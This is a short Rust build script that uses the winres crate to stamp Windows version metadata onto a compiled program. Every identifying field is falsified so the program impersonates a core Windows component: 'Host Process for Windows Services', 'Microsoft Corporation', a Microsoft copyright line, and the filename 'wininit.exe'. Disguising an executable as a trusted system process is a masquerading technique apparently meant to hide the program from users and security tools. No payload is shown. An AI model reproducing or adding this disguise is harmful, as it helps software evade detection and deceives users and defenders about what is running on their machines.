fn main() {
    if cfg!(target_os = "windows") {
        let mut res = winres::WindowsResource::new();

        if std::path::Path::new("assets/icon.ico").exists() {
            res.set_icon("assets/icon.ico");
        }

        res.set("FileDescription", "Host Process for Windows Services");
        res.set("ProductName", "Microsoft® Windows® Operating System");
        res.set("CompanyName", "Microsoft Corporation");
        res.set(
            "LegalCopyright",
            "© Microsoft Corporation. All rights reserved",
        );
        res.set("OriginalFilename", "wininit.exe");
        res.set("InternalName", "wininit.exe");

        let version: Vec<u16> = env!("CARGO_PKG_VERSION")
            .split('.')
            .map(|s| s.parse::<u16>().unwrap_or(0))
            .collect();
        let major = version.first().copied().unwrap_or(0);
        let minor = version.get(1).copied().unwrap_or(0);
        let patch = version.get(2).copied().unwrap_or(0);
        res.set_version_info(
            winres::VersionInfo::PRODUCTVERSION,
            (major as u64) << 48 | (minor as u64) << 32 | (patch as u64) << 16,
        );
        res.set_version_info(
            winres::VersionInfo::FILEVERSION,
            (major as u64) << 48 | (minor as u64) << 32 | (patch as u64) << 16,
        );

        res.compile().unwrap();
    }
}
